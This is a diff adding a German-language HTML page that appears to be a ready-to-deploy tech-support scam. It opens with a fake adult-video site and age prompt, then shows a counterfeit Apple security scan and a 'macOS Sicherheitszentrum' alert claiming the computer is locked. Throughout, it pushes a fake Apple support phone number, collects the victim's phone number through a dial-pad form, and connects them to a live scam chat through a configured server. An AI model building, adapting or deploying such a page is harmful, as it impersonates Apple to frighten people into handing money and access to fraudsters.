@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ==================== GLOBAL CONFIGURATION ==================== -->
+    <!-- Change this phone number once and it will be used everywhere on the site -->
+    <script>
+        const GLOBAL_PHONE_NUMBER = '0800-100-183';
+    </script>
+    <!-- ==================== END GLOBAL CONFIGURATION ==================== -->
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>⚠️ Sind Sie über 18 Jahre alt?</title>
+    <link rel="icon" id="favicon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚠️</text></svg>">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+<script src="https://cdn.usefathom.com/script.js" data-site="MPPUSVJV" defer></script>
+
+    <!-- Pusher for WebSocket -->
+    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
+    
+    <!-- Chat Configuration - Local Development with INSTANT WebSocket -->
+    <script>
+        // Always use staging server configuration
+        window.CHAT_CONFIG = {
+            server: 'https://chatstaging.maxlandmedia.com',
+            wsHost: 'chatstaging.maxlandmedia.com',
+            wsPort: 443,
+            wsKey: 'xjghttmxpqekynr9djr9'
+        };
+        console.log('🚀 CHAT CONFIGURED FOR STAGING:', window.CHAT_CONFIG);
+    </script>
+
+</head>
+<body class="overlay-active">
+    <!-- 18+ Age Verification Prompt -->
+    <div id="age-verification-overlay" style="display: none;">
+        <div class="age-verification-backdrop"></div>
+        <div class="age-verification-prompt">
+            <button class="age-close-btn" id="age-close" title="Schließen">×</button>
+            <div class="age-prompt-icon">
+                <img src="overlay/18.png" alt="18+">
+            </div>
+            <h2>Bist du 18+?</h2>
+            <p>Du musst 18 Jahre oder älter sein, um fortzufahren</p>
+            <div class="age-choice-buttons">
+                <button class="age-yes-btn" id="age-yes">Ja, ich bin 18+</button>
+                <button class="age-no-btn" id="age-no">Nein</button>
+            </div>
+            <button class="age-cancel-btn" id="age-cancel">Abbrechen</button>
+        </div>
+    </div>
+
+    <!-- Video Player Website Overlay -->
+    <div id="video-player-site">
+        <div class="video-site-container">
+            <!-- Header -->
+            <header class="video-site-header">
+                <div class="header-left">
+                    <button class="menu-btn"><i class="fas fa-bars"></i></button>
+                    <div class="site-logo">
+                        <img src="overlay/overlay-logo.png" alt="Logo">
+                    </div>
+                </div>
+                <div class="header-search">
+                    <input type="text" placeholder="Suchen" readonly>
+                    <button><i class="fas fa-search"></i></button>
+                </div>
+                <div class="header-right">
+                    <button class="header-icon-btn"><i class="fas fa-video"></i></button>
+                    <button class="header-icon-btn"><i class="fas fa-bell"></i></button>
+                    <button class="login-btn">Anmelden</button>
+                    <button class="signup-btn">Registrieren</button>
+                </div>
+            </header>
+
+            <!-- Main Content -->
+            <div class="video-site-content">
+                <!-- Main Video Player -->
+                <div class="main-player-section">
+                    <div class="video-player-wrapper">
+                        <video id="main-player-video" autoplay loop muted playsinline controls preload="auto">
+                            <source src="" type="video/mp4">
+                            Dein Browser unterstützt das Video-Tag nicht.
+                        </video>
+                    </div>
+                    <div class="video-info">
+                        <h2 id="current-video-title">Video wird geladen...</h2>
+                        <div class="video-meta-row">
+                            <div class="video-stats">
+                                <span class="views"><span id="video-views">0</span> Aufrufe</span>
+                                <span class="date"><span id="video-date">Heute</span></span>
+                            </div>
+                            <div class="video-actions">
+                                <button class="action-btn">
+                                    <i class="fas fa-thumbs-up"></i>
+                                    <span class="like-count">1,2 Tsd</span>
+                                </button>
+                                <button class="action-btn">
+                                    <i class="fas fa-thumbs-down"></i>
+                                    <span>Gefällt mir nicht</span>
+                                </button>
+                                <button class="action-btn">
+                                    <i class="fas fa-share"></i>
+                                    <span>Teilen</span>
+                                </button>
+                                <button class="action-btn">
+                                    <i class="fas fa-plus"></i>
+                                    <span>Speichern</span>
+                                </button>
+                                <button class="action-btn">
+                                    <i class="fas fa-ellipsis-h"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Channel Info -->
+                    <div class="channel-info">
+                        <div class="channel-avatar">
+                            <i class="fas fa-user-circle"></i>
+                        </div>
+                        <div class="channel-details">
+                            <h3 class="channel-name">xHamster</h3>
+                            <p class="subscriber-count">2,4 Mio. Abonnenten</p>
+                        </div>
+                        <button class="subscribe-btn">Abonnieren</button>
+                    </div>
+                    
+                    <!-- Video Description -->
+                    <div class="video-description">
+                        <p>Exklusive Inhalte für Erwachsene. Bitte beachten Sie, dass dieses Video nur für Personen über 18 Jahren bestimmt ist.</p>
+                        <button class="show-more-btn">Mehr anzeigen</button>
+                    </div>
+                    
+                    <!-- Comments Section -->
+                    <div class="comments-section">
+                        <div class="comments-header">
+                            <h3><span class="comment-count">847</span> Kommentare</h3>
+                            <div class="sort-comments">
+                                <i class="fas fa-sort-amount-down"></i>
+                                <span>Sortieren nach</span>
+                            </div>
+                        </div>
+                        
+                        <div class="add-comment">
+                            <div class="comment-avatar">
+                                <i class="fas fa-user-circle"></i>
+                            </div>
+                            <input type="text" placeholder="Kommentar hinzufügen..." readonly>
+                        </div>
+                        
+                        <div class="comments-list">
+                            <div class="comment-item">
+                                <div class="comment-avatar">
+                                    <i class="fas fa-user-circle"></i>
+                                </div>
+                                <div class="comment-content">
+                                    <div class="comment-header">
+                                        <span class="comment-author">@HamsterFan2024</span>
+                                        <span class="comment-date">vor 2 Stunden</span>
+                                    </div>
+                                    <p class="comment-text">Wow, das ist echt geil! Genau mein Geschmack 🔥</p>
+                                    <div class="comment-actions">
+                                        <button><i class="fas fa-thumbs-up"></i> 156</button>
+                                        <button><i class="fas fa-thumbs-down"></i></button>
+                                        <button>Antworten</button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="comment-item">
+                                <div class="comment-avatar">
+                                    <i class="fas fa-user-circle"></i>
+                                </div>
+                                <div class="comment-content">
+                                    <div class="comment-header">
+                                        <span class="comment-author">@DeutscheFan789</span>
+                                        <span class="comment-date">vor 5 Stunden</span>
+                                    </div>
+                                    <p class="comment-text">Hammer Video! Vielen Dank fürs Teilen!</p>
+                                    <div class="comment-actions">
+                                        <button><i class="fas fa-thumbs-up"></i> 89</button>
+                                        <button><i class="fas fa-thumbs-down"></i></button>
+                                        <button>Antworten</button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="comment-item">
+                                <div class="comment-avatar">
+                                    <i class="fas fa-user-circle"></i>
+                                </div>
+                                <div class="comment-content">
+                                    <div class="comment-header">
+                                        <span class="comment-author">@Zuschauer2024</span>
+                                        <span class="comment-date">vor 1 Tag</span>
+                                    </div>
+                                    <p class="comment-text">Sehr heiß! Mehr davon bitte! 😍</p>
+                                    <div class="comment-actions">
+                                        <button><i class="fas fa-thumbs-up"></i> 234</button>
+                                        <button><i class="fas fa-thumbs-down"></i></button>
+                                        <button>Antworten</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Sidebar with Thumbnails -->
+                <div class="sidebar-videos">
+                    <h3>Als Nächstes</h3>
+                    <div id="video-thumbnails-list">
+                        <!-- Thumbnails will be dynamically generated -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Image Overlay -->
+    <div id="imageOverlay" class="image-overlay"></div>
+    <div class="window">
+        <!-- Titlebar -->
+        <div class="titlebar">
+            <div class="traffic-lights">
+                <span class="traffic-light red"></span>
+                <span class="traffic-light yellow"></span>
+                <span class="traffic-light green"></span>
+            </div>
+            <h1 class="window-title">Sicherheitsscan</h1>
+        </div>
+
+        <!-- Main Content -->
+        <div class="content">
+            <!-- Left Summary Panel -->
+            <div class="summary-panel">
+                <div class="summary-card">
+                    <h2>Zusammenfassung</h2>
+                    
+                    <div class="stat-row">
+                        <span class="stat-label">Gescannte Dateien</span>
+                        <span class="stat-value" id="filesScanned">0</span>
+                    </div>
+                    
+                    <div class="stat-row">
+                        <span class="stat-label">Bedrohungen erkannt</span>
+                        <span class="stat-value threat-count" id="threatsDetected">0</span>
+                    </div>
+                    
+                    <div class="stat-row">
+                        <span class="stat-label">Verstrichene Zeit</span>
+                        <span class="stat-value" id="elapsedTime">00:00</span>
+                    </div>
+
+                    <div class="stat-row">
+                        <span class="stat-label">Fortschritt</span>
+                        <span class="stat-value progress-value" id="summaryProgress">0.0%</span>
+                    </div>
+                    
+                    <div class="status-section">
+                        <span class="status-badge scanning" id="statusBadge">Scanvorgang läuft...</span>
+                    </div>
+
+                    <div class="chat-button-container">
+                        <button class="mac-button-cancel" id="cancelButton">
+                            Abbrechen
+                        </button>
+                        <button class="mac-button-ok" id="okButton">
+                            OK
+                        </button>
+                    </div>
+                </div>
+
+                <div class="cpu-card">
+                    <div class="cpu-header">
+                        <h3>CPU-Auslastung</h3>
+                        <span class="cpu-percentage" id="cpuPercentage">87%</span>
+                    </div>
+                    <div class="graph-container">
+                        <canvas id="cpuGraph"></canvas>
+                    </div>
+                    <div class="cpu-status">
+                        <span class="status-indicator high"></span>
+                        <span class="status-text">Hohe CPU-Auslastung erkannt</span>
+                    </div>
+                </div>
+
+
+            </div>
+
+            <!-- Right Scan View -->
+            <div class="scan-panel">
+                <!-- Scan Header -->
+                <div class="scan-header">
+                    <img src="mlogo.png" alt="Apple Sicherheit" class="scan-logo">
+                    <h2 class="scan-title">Apple Sicherheitsscan läuft</h2>
+                </div>
+
+                <!-- Progress Bar -->
+                <div class="progress-section">
+                    <div class="progress-container">
+                        <div class="progress-track">
+                            <div class="progress-fill" id="progressFill"></div>
+                            <div class="progress-text" id="progressText">0.0%</div>
+                        </div>
+                    </div>
+                    
+                    <div class="current-scan">
+                        <span class="current-label">Aktuell wird gescannt:</span>
+                        <span class="current-path" id="currentPath">/System/Library/LaunchDaemons</span>
+                    </div>
+                </div>
+
+                <!-- Controls -->
+                <div class="controls">
+                    <button id="btnPause" disabled>Pause</button>
+                    <button id="btnResume" disabled>Fortsetzen</button>
+                    <button id="btnCancel" disabled>Abbrechen</button>
+                </div>
+
+                <!-- Recent Scans -->
+                <div class="recent-scans">
+                    <h3>Letzte Scans</h3>
+                    <div class="scan-list" id="recentList"></div>
+                </div>
+            </div>
+        </div>
+
+       
+
+    <!-- Security Warning Dialog -->
+    <div class="security-dialog">
+        <div class="dialog-titlebar">
+            <div class="dialog-traffic-lights">
+                <span class="dialog-traffic-light red"></span>
+                <span class="dialog-traffic-light yellow"></span>
+                <span class="dialog-traffic-light green"></span>
+            </div>
+            <div class="dialog-title">macOS Sicherheitszentrum</div>
+        </div>
+        <div class="dialog-content">
+            <div class="warning-icon">⚠️</div>
+            <h2>Kritischer Sicherheitsalarm</h2>
+                            <div class="security-message">
+                    <p class="alert-text">Ihr Computer wurde aus Sicherheitsgründen gesperrt:</p>
+                    <ul class="security-issues">
+                        <li>Mehrere verdächtige Aktivitäten erkannt</li>
+                        <li>Systemdateien möglicherweise kompromittiert</li>
+                        <li>Persönliche Daten gefährdet</li>
+                        <li>Versuchter Netzwerksicherheitsverstoß</li>
+                    </ul>
+                    <div class="support-info">
+                        <p>Kontaktieren Sie sofort den Apple Sicherheitssupport:</p>
+                        <div class="phone-number">0800-100-183</div>
+                        <div class="dialog-button-container">
+                            <button class="mac-button-cancel mac-chat-dialog-btn" onclick="openChat()">
+                                Jetzt chatten
+                            </button>
+                            <button class="mac-button-ok" id="dialogOkButton">
+                                OK
+                            </button>
+                        </div>
+                        <p class="support-id" id="supportId">Support-ID: MAC-SEC-</p>
+                    </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- System Icons -->
+    <div class="system-icons">
+        <img src="finder.png" alt="Finder" class="system-icon" title="Finder">
+        <img src="settings.png" alt="Settings" class="system-icon" title="System Settings">
+    </div>
+
+    <!-- Prompt Boxes -->
+    <div class="prompt-box" id="errorPrompt">
+        <img src="icon2.png" alt="Error Icon">
+        <p>macOS Sicherheitszentrum ist abgestürzt. Bitte versuchen Sie es erneut.</p>
+        <button id="tryAgainBtn">Erneut versuchen</button>
+    </div>
+
+    <div class="prompt-box hidden" id="supportPrompt">
+        <img src="icon2.png" alt="Support Icon">
+        <p>Bitte rufen Sie sofort den Apple Support an</p>
+        <div class="support-phone">0800-100-183</div>
+    </div>
+
+    <!-- Support Box -->
+    <div class="support-box">
+        <img src="mlogo.png" alt="Apple Support" class="support-logo">
+        <h3>Apple Support anrufen</h3>
+        <div class="support-phone">0800-100-183</div>
+        <div class="support-text">24/7 verfügbar für dringende Sicherheitsprobleme</div>
+        <button class="mac-chat-btn" onclick="openChat()">
+            <img src="mlogo.png" alt="Apple" class="mac-btn-logo">
+            Chat mit Apple
+        </button>
+    </div>
+
+    <!-- Chat Form Windows -->
+    <!-- Step 1: Country Selection -->
+    <div class="chat-window hidden" id="countrySelect">
+        <div class="chat-titlebar">
+            <div class="chat-traffic-lights">
+                <span class="chat-traffic-light red" id="closeCountrySelect"></span>
+                <span class="chat-traffic-light yellow"></span>
+                <span class="chat-traffic-light green"></span>
+            </div>
+            <div class="chat-title">Wählen Sie Ihr Land</div>
+        </div>
+        <div class="chat-content">
+            <div class="country-options">
+                <button class="country-option" data-code="+49" data-country="Germany">
+                    <span class="country-flag">🇩🇪</span>
+                    <span class="country-name">Deutschland</span>
+                    <span class="country-code">+49</span>
+                </button>
+                <button class="country-option" data-code="+43" data-country="Austria">
+                    <span class="country-flag">🇦🇹</span>
+                    <span class="country-name">Österreich</span>
+                    <span class="country-code">+43</span>
+                </button>
+                <button class="country-option" data-code="+41" data-country="Switzerland">
+                    <span class="country-flag">🇨🇭</span>
+                    <span class="country-name">Schweiz</span>
+                    <span class="country-code">+41</span>
+                </button>
+                <button class="country-option" data-code="+352" data-country="Luxembourg">
+                    <span class="country-flag">🇱🇺</span>
+                    <span class="country-name">Luxembourg</span>
+                    <span class="country-code">+352</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Step 2: Dial Pad -->
+    <div class="chat-window hidden" id="dialPad">
+        <div class="chat-titlebar">
+            <div class="chat-traffic-lights">
+                <span class="chat-traffic-light red" id="closeDialPad"></span>
+                <span class="chat-traffic-light yellow"></span>
+                <span class="chat-traffic-light green"></span>
+            </div>
+            <div class="chat-title">Geben Sie Ihre Telefonnummer ein</div>
+        </div>
+        <div class="chat-content">
+            <div class="phone-input">
+                <span class="country-code-display" id="selectedCountryCode">+49</span>
+                <span class="phone-number-display" id="phoneNumber"></span>
+                <button class="backspace" id="backspace">⌫</button>
+            </div>
+            <div class="dial-pad">
+                <button class="dial-button">1</button>
+                <button class="dial-button">2</button>
+                <button class="dial-button">3</button>
+                <button class="dial-button">4</button>
+                <button class="dial-button">5</button>
+                <button class="dial-button">6</button>
+                <button class="dial-button">7</button>
+                <button class="dial-button">8</button>
+                <button class="dial-button">9</button>
+                <button class="dial-button">0</button>
+            </div>
+            <button class="submit-button" id="submitPhone">Absenden</button>
+        </div>
+    </div>
+
+    <!-- Step 2.5: Phone Confirmation -->
+    <div class="chat-window hidden" id="phoneConfirmation">
+        <div class="chat-titlebar">
+            <div class="chat-traffic-lights">
+                <span class="chat-traffic-light red" id="closePhoneConfirm"></span>
+                <span class="chat-traffic-light yellow"></span>
+                <span class="chat-traffic-light green"></span>
+            </div>
+            <div class="chat-title">Nummer bestätigen</div>
+        </div>
+        <div class="chat-content" style="padding: 30px 24px;">
+            <div style="text-align: center; margin-bottom: 20px;">
+                <div style="font-size: 14px; color: rgba(255, 255, 255, 0.7); margin-bottom: 12px;">Ihre Telefonnummer:</div>
+                <div id="macConfirmPhoneDisplay" style="font-size: 28px; font-weight: 600; color: #0A84FF; margin-bottom: 24px;"></div>
+            </div>
+            <div style="display: flex; flex-direction: column; gap: 12px;">
+                <button id="macEditPhoneBtn" style="padding: 14px 20px; background: rgba(60, 60, 65, 0.8); color: #fff; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s;">
+                    ✏️ Nummer bearbeiten
+                </button>
+                <button id="macConfirmPhoneBtn" style="padding: 14px 20px; background: linear-gradient(to bottom, #0A84FF, #0066CC); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; box-shadow: 0 2px 8px rgba(10, 132, 255, 0.3);">
+                    ✓ Bestätigen & Chat starten
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Step 3: Chat Interface -->
+    <div class="chat-window hidden" id="confirmation">
+        <div class="chat-titlebar">
+            <div class="chat-traffic-lights">
+                <span class="chat-traffic-light red" id="closeConfirmation"></span>
+                <span class="chat-traffic-light yellow"></span>
+                <span class="chat-traffic-light green"></span>
+            </div>
+            <div class="chat-title">Apple Support Chat</div>
+        </div>
+        <div class="chat-content" style="padding: 0; display: flex; flex-direction: column; height: 500px;">
+            <!-- Chat Header -->
+            <div style="padding: 16px 20px; border-bottom: 1px solid rgba(255, 255, 255, 0.1);">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <img src="mlogo.png" alt="Agent" style="width: 36px; height: 36px; border-radius: 18px; background: rgba(255, 255, 255, 0.1); padding: 6px;">
+                    <div>
+                        <div style="font-weight: 500; color: #fff; font-size: 14px;">Apple Support: <span id="macChatHeaderPhone" style="color: #0A84FF;">0800-100-183</span></div>
+                        <div style="font-size: 12px; color: rgba(255, 255, 255, 0.6);">Verbinde mit einem Agent...</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Chat Messages Area -->
+            <div class="chat-messages-area" id="chatMessagesArea" style="flex: 1; padding: 20px; overflow-y: auto; background: rgba(40, 40, 45, 0.5);">
+                <div style="text-align: center; color: rgba(255, 255, 255, 0.6); margin-bottom: 16px;">
+                    <div style="margin-bottom: 12px;">
+                        <img src="mlogo.png" alt="Apple Logo" style="width: 48px; height: 48px; margin-bottom: 8px; background: rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 8px;">
+                        <div style="font-weight: 500; color: #fff; font-size: 15px;">Willkommen beim Apple Support</div>
+                    </div>
+                    <div style="font-size: 13px; color: rgba(255, 255, 255, 0.6);">Verbinde Sie mit einem Support-Agent...</div>
+                    <div style="margin-top: 8px; font-size: 12px; color: #0A84FF;">Geschätzte Wartezeit: weniger als 1 Minute</div>
+                </div>
+            </div>
+            
+            <!-- Typing Indicator -->
+            <div class="typing-indicator" id="typingIndicator" style="display: none; font-size: 12px; color: rgba(255, 255, 255, 0.6); padding: 8px 20px;"></div>
+            
+            <!-- Message Input -->
+            <div style="padding: 16px; border-top: 1px solid rgba(255, 255, 255, 0.1); background: rgba(40, 40, 45, 0.8);">
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" id="messageInput" placeholder="Nachricht eingeben..." style="flex: 1; padding: 10px 14px; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; font-size: 14px; background: rgba(60, 60, 65, 0.8); color: #fff; outline: none;" autocomplete="off">
+                    <button id="sendMessage" style="padding: 10px 20px; background: linear-gradient(to bottom, #0A84FF, #0066CC); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; min-width: 70px;">Senden</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div class="toast-container" id="toastContainer" role="alert" aria-live="polite"></div>
+    
+    <!-- Connection Failed Modal -->
+    <div id="macConnectionFailedModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); z-index: 999999; align-items: center; justify-content: center;">
+        <div style="background: linear-gradient(135deg, #2b2b2d 0%, #1c1c1e 100%); border-radius: 16px; padding: 40px; max-width: 420px; width: 90%; text-align: center; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.1);">
+            <div style="font-size: 64px; margin-bottom: 20px; animation: pulse 2s ease-in-out infinite;">⚠️</div>
+            <h2 style="color: #FF3B30; font-size: 24px; margin: 0 0 16px 0; font-weight: 600;">Verbindung fehlgeschlagen</h2>
+            <p style="color: rgba(255, 255, 255, 0.8); font-size: 15px; margin: 0 0 24px 0; line-height: 1.6;">Die Verbindung zum Support konnte nicht hergestellt werden. Bitte rufen Sie uns direkt an oder versuchen Sie es erneut.</p>
+            <div style="background: rgba(10, 132, 255, 0.1); border: 2px solid #0A84FF; border-radius: 12px; padding: 20px; margin-bottom: 24px;">
+                <div style="font-size: 13px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">Apple Support</div>
+                <div id="macFailedModalPhone" style="font-size: 28px; font-weight: 600; color: #0A84FF;">0800-100-183</div>
+            </div>
+            <div>
+                <button id="macCloseFailedModalBtn" style="width: 100%; padding: 14px 20px; background: linear-gradient(to bottom, #0A84FF, #0066CC); color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 15px; font-weight: 500; box-shadow: 0 4px 12px rgba(10, 132, 255, 0.4); transition: all 0.2s;">
+                    Schließen
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Audio Elements -->
+    <audio id="mainAudio" loop>
+        <source src="main.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="step1Audio">
+        <source src="audio/1.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="step2Audio">
+        <source src="audio/2.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="stepMidAudio">
+        <source src="audio/mid.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="step3Audio">
+        <source src="audio/3.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="notificationAudio">
+        <source src="notification.mp3" type="audio/mpeg">
+    </audio>
+    
+    <!-- Message-specific audio triggers -->
+    <audio id="audioA">
+        <source src="audio/a.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audioB">
+        <source src="audio/b.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audioC">
+        <source src="audio/c.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="audioD">
+        <source src="audio/d.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="reminderAudio">
+        <source src="audio/reminder.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="chatErrorAudio">
+        <source src="audio/chaterror.mp3" type="audio/mpeg">
+    </audio>
+
+    <script src="app.js"></script>
+    
+    <!-- Apply Global Phone Number to all elements -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneElements = document.querySelectorAll('.support-phone, .phone-number');
+            phoneElements.forEach(function(element) {
+                if (element) {
+                    element.textContent = GLOBAL_PHONE_NUMBER;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
